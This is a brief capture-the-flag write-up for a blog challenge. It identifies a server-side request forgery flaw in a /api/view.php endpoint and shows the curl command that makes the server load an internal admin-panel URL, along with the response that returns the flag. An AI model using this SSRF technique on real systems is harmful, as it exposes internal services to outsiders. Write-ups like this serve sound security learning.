The vulnerable part of the code is this code snippet
'''
  
    <script>
        const API_PATH = '/api/view.php';

        async function fetchPost(id) {
            const fetchResult = await fetch(API_PATH, {
                method: 'POST',
                cache: 'no-cache',
                headers: {
                    'Content-type': 'application/json'
                },
                body: JSON.stringify({ post: `file:///posts/${id}` })
            });
'''
The api endpoint code loads any url submitted to it and it makes it susceptible to Server side request forgery which occurs when a website is induced to load a particular url.
The main task in the challenge is to load a url that can't be accessed outside.With the vulnerable part of site,I used curl to solve it by submitting the url that can't be accessed outside except eithin the server.
'''
#THE CURL request
curl https://ecorpblog.uctf.ir/api/view.php -v -X POST --header 'Content-Type:application/json' -d '{"post": "http://admin-panel.local/"}'
'''
'''
####RESPONSE#####
* Using Stream ID: 1
> POST /api/view.php HTTP/2
> Host: ecorpblog.uctf.ir
> User-Agent: curl/8.2.1
> Accept: */*
> Content-Type:application/json
> Content-Length: 37
>
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* old SSL session ID is stale, removing
< HTTP/2 200
< date: Sun, 03 Sep 2023 13:33:41 GMT
< content-type: application/json
< content-length: 50
< vary: Accept-Encoding
< x-powered-by: PHP/7.2.34
< x-xss-protection: 1; mode=block
< server: ArvanCloud
< x-sid: 4101
< server-timing: total;dur=98
< x-request-id: b72a53f22b5cf18d0b1bb14a5cf75106
< accept-ranges: bytes
<
* Connection #1 to host ecorpblog.uctf.ir left intact
{"status":"success","post":"uctf{4z174_1n_urm14}"}
'''

